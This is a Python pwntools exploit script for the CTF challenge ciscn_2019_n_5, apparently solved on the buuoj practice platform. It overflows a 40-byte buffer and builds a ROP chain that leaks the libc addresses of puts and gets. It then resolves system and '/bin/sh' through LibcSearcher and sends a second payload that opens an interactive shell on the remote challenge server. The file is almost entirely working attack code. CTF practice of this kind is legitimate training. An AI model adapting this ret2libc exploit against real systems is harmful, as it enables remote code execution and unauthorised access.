from LibcSearcher import LibcSearcher
from pwn import *


def ciscn_2019_n_5(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_n_5'):
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 27061)
    target_elf = ELF(file_name)

    main_addr = p64(target_elf.symbols['main'])
    puts_plt = p64(target_elf.plt['puts'])
    puts_got = p64(target_elf.got['puts'])
    gets_got = p64(target_elf.got['gets'])

    pop_ret_gadget = p64(0x400713)  # pop rdi ; ret

    payload_1 = b'A' * 40
    # puts(puts_got)
    payload_1 += pop_ret_gadget + puts_got + puts_plt
    # puts(gets_got)
    payload_1 += pop_ret_gadget + gets_got + puts_plt
    # main()
    payload_1 += main_addr

    target.sendlineafter('tell me your name', 'your dad!')
    # gdb.attach(target)
    target.sendlineafter('say to me?', payload_1)

    print(target.recvuntil('\n'))
    puts_addr = u64(target.recv(6).ljust(8, b'\x00'))
    print(target.recvuntil('\n'))
    gets_addr = u64(target.recv(6).ljust(8, b'\x00'))

    print(hex(puts_addr))
    print(hex(gets_addr))

    searcher = LibcSearcher('puts', puts_addr)
    searcher.add_condition('gets', gets_addr)
    libc_base_addr = puts_addr - searcher.dump('puts')
    system_addr = p64(libc_base_addr + searcher.dump('system'))
    bin_sh_str = p64(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * 40
    # system(/bin/sh)
    payload_2 += pop_ret_gadget + bin_sh_str + system_addr

    target.sendlineafter('tell me your name', 'your dad!')
    target.sendlineafter('say to me?', payload_2)
    target.interactive()


if __name__ == '__main__':
    ciscn_2019_n_5()
